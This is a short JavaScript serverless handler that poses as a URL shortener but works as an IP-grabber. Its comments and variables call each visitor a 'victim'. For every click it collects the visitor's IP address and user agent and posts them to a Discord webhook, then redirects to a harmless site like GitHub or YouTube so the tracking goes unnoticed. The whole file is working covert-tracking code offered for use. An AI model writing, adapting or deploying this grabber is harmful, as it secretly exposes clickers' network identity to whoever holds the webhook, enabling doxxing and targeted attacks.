export default async function handler(req, res) {
  const { slug } = req.query;
  
  // Get victim data
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  
  const victimData = {
    timestamp: new Date().toISOString(),
    ip: ip,
    userAgent: userAgent,
    slug: slug,
    type: 'URL_Shortener'
  };
  
  // Send to Discord
  await sendToDiscord(victimData);
  
  // Redirect to actual destination based on slug
  const destinations = {
    'github': 'https://github.com',
    'twitter': 'https://twitter.com',
    'discord': 'https://discord.com',
    'youtube': 'https://youtube.com'
  };
  
  const destination = destinations[slug] || 'https://github.com';
  res.redirect(302, destination);
}

async function sendToDiscord(victimData) {
  const webhookURL = process.env.DISCORD_WEBHOOK_URL;
  
  const embed = {
    title: "🔗 URL Shortener Click",
    color: 0x00ff00,
    fields: [
      {
        name: "🌐 IP Address",
        value: `\`\`\`${victimData.ip}\`\`\``,
        inline: true
      },
      {
        name: "🔗 Short Link",
        value: victimData.slug,
        inline: true
      },
      {
        name: "🕒 Time",
        value: `<t:${Math.floor(new Date(victimData.timestamp).getTime() / 1000)}:R>`
      },
      {
        name: "📱 User Agent",
        value: `\`\`\`${victimData.userAgent.substring(0, 50)}...\`\`\``
      }
    ]
  };
  
  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (error) {
    console.error('Discord webhook failed:', error);
  }
}
